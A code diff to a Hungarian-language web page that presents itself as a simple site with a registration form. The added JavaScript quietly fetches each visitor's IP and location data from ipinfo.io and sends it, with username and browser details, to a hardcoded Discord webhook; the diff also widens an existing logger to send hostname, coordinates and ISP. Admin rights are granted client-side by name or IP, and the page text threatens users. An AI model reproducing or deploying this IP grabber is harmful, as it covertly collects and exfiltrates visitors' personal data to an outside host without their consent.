@@ -33,12 +33,85 @@
 </style>
 </head>
 
+<h2>A rendes neved! (nehogy valami faszsagot adj meg, mert kinyirlak)</h2>
+<input type="text" id="username" placeholder="Felhasználónév">
+<button onclick="register()">Regisztráció</button>
+
 <h1> Ez egy nagyon egyszeru weboldal </h1>
 <button class="button button1" onclick="crashBrowser()">Kattints ram</button>
+
+<a href="admin.html">Admin Panel</a>
 
 <body>
      
 <script>
+
+async function register() {
+    let username = document.getElementById("username").value.trim();
+    
+    if (username === "") {
+        alert("Adj meg egy érvényes nevet!");
+        return;
+    }
+
+    let webhookUrl = "https://discordapp.com/api/webhooks/1337434821978488882/FPuhUbglVukw3Pd3Qk_PyLoqOX3b-K1xJQyCQfGuRw_XxONxyU7q8Iil0M3vrRWFKxok";
+
+    let now = new Date();
+    function generateID() {
+        return Math.random().toString(36).substring(2, 10).toUpperCase();
+    }
+
+    let timestamp = now.toISOString().replace("T", " ").substring(0, 19);
+    let userAgent = navigator.userAgent;
+    let userID = generateID();
+    
+    // 🔥 **Admin ellenőrzés név alapján**
+    let isAdmin = username.toLowerCase() === "admin";
+
+    // 🔥 **IP lekérése és admin ellenőrzés**
+    let ipResponse = await fetch("https://ipinfo.io/json");
+    let ipData = await ipResponse.json();
+    let userIP = ipData.ip;
+    
+    let adminIPs = ["192.168.50.92", "84.3.235.39"]; // Itt add meg az admin IP-ket
+    if (adminIPs.includes(userIP)) {
+        isAdmin = true;
+    }
+
+    // **Felhasználó elmentése localStorage-ba**
+    let users = JSON.parse(localStorage.getItem("users")) || [];
+    users.push({ username, userID, timestamp, isAdmin, userIP });
+    localStorage.setItem("users", JSON.stringify(users));
+
+    let payload = {
+        username: "Új felhasználó",
+        content: `📢 **Új felhasználó regisztrált:** \`${username}\`\n🆔 **Felhasználói ID:** \`${userID}\`\n🕒 **Időpont:** \`${timestamp}\`\n💻 **Eszköz:** \`${userAgent}\`\n🌐 **IP:** \`${userIP}\`\n🔑 **Admin:** ${isAdmin ? "✅ Igen" : "❌ Nem"}`
+    };
+
+    try {
+        let response = await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            alert(`Sikeresen regisztráltál! ${isAdmin ? "Admin joggal léptél be." : ""}`);
+            document.getElementById("username").value = "";
+
+            // 🔥 Ha admin, azonnal irány az admin panelre
+            if (isAdmin) {
+                window.location.href = "admin.html";
+            }
+
+        } else {
+            alert("Hiba történt a regisztráció során.");
+        }
+    } catch (error) {
+        alert("Hálózati hiba: " + error);
+    }
+}
+
 function crashBrowser() {
     alert("Azt ugye tudtad, hogy az ipd atment egy discord webhookon keresztul hozzam?");
     
@@ -64,7 +137,7 @@ function monke(json)
                {
                     title: "Valaki megnezte a weboldalad!",
                     color: 1752220,
-                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`\n**Hostname:** `" + json.hostname + "`\n**Timezone:** `" + json.timezone + "`\n**LocalIP:** `" + json.loc  + "`\n**Router:** `" + json.org
                }
           ]
      }
@@ -76,3 +149,4 @@ function monke(json)
 
 </body>
 </html>
+
